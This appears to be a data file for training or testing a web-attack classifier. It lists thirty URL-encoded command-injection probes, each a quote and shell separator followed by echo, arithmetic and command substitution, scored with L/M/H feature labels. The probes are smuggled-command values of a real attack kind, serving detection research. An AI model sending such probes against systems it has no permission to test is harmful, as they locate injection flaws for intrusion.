attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
'echo%20uvxcgd$((51%2b43))$(echo%20uvxcgd)uvxcgd\	M	L	L	L	M	M	L	M	
'%20echo%20bybkhf$((87%2b41))$(echo%20bybkhf)bybkhf\	M	L	L	L	M	M	L	M	
';echo%20acekki$((66%2b70))$(echo%20acekki)acekki\	M	L	L	L	M	M	L	M	
'&echo%20wheuex$((35%2b4))$(echo%20wheuex)wheuex\	M	L	L	L	M	M	L	M	
'|echo%20lttdyl$((1%2b42))$(echo%20lttdyl)lttdyl\	M	L	L	L	M	M	L	M	
'||echo%20vayjrw$((6%2b1))$(echo%20vayjrw)vayjrw\	M	L	L	L	M	M	L	M	
'&&echo%20wzzout$((83%2b36))$(echo%20wzzout)wzzout\	M	L	L	L	M	M	L	M	
'%0aecho%20bmhvjk$((19%2b30))$(echo%20bmhvjk)bmhvjk\	M	L	L	L	M	M	L	M	
'%3becho%20hqbncx$((10%2b83))$(echo%20hqbncx)hqbncx\	M	L	L	L	M	M	L	M	
'%26echo%20brrosl$((24%2b11))$(echo%20brrosl)brrosl\	M	L	L	L	M	M	L	M	
'%26%26echo%20ikukjx$((80%2b89))$(echo%20ikukjx)ikukjx\	H	L	L	L	M	M	L	M	
'%7cecho%20kajapa$((75%2b48))$(echo%20kajapa)kajapa\	M	L	L	L	M	M	L	M	
'%7c%7cecho%20jjssjl$((99%2b38))$(echo%20jjssjl)jjssjl\	H	L	L	L	M	M	L	M	
'echo%20qqehpp$((69%2b2))$(echo%20qqehpp)qqehpp&	M	L	L	L	M	M	L	M	
'%20echo%20jftfzw$((33%2b39))$(echo%20jftfzw)jftfzw&	M	L	L	L	M	M	L	M	
';echo%20pyznpf$((23%2b64))$(echo%20pyznpf)pyznpf&	M	L	L	L	M	M	L	M	
'&echo%20xyoexk$((74%2b11))$(echo%20xyoexk)xyoexk&	M	L	L	L	M	M	L	M	
'|echo%20ycixvi$((40%2b81))$(echo%20ycixvi)ycixvi&	M	L	L	L	M	M	L	M	
'||echo%20gerzzx$((98%2b84))$(echo%20gerzzx)gerzzx&	M	L	L	L	M	M	L	M	
'&&echo%20hvtwdk$((44%2b47))$(echo%20hvtwdk)hvtwdk&	M	L	L	L	M	M	L	M	
'%0aecho%20mgxprt$((51%2b4))$(echo%20mgxprt)mgxprt&	M	L	L	L	M	M	L	M	
'%3becho%20ufyccq$((51%2b2))$(echo%20ufyccq)ufyccq&	M	L	L	L	M	M	L	M	
'%26echo%20juibau$((1%2b74))$(echo%20juibau)juibau&	M	L	L	L	M	M	L	M	
'%26%26echo%20bmiijq$((29%2b3))$(echo%20bmiijq)bmiijq&	H	L	L	L	M	M	L	M	
'%7cecho%20zpvfox$((81%2b22))$(echo%20zpvfox)zpvfox&	M	L	L	L	M	M	L	M	
'%7c%7cecho%20slvmkv$((96%2b0))$(echo%20slvmkv)slvmkv&	H	L	L	L	M	M	L	M	
'echo%20hbtlle$((1%2b32))$(echo%20hbtlle)hbtlle|	M	L	L	L	M	M	L	M	
'%20echo%20hnolcq$((85%2b27))$(echo%20hnolcq)hnolcq|	M	L	L	L	M	M	L	M	
';echo%20ccxtnp$((57%2b74))$(echo%20ccxtnp)ccxtnp|	M	L	L	L	M	M	L	M	
'&echo%20elyxqo$((59%2b10))$(echo%20elyxqo)elyxqo|	M	L	L	L	M	M	L	M	
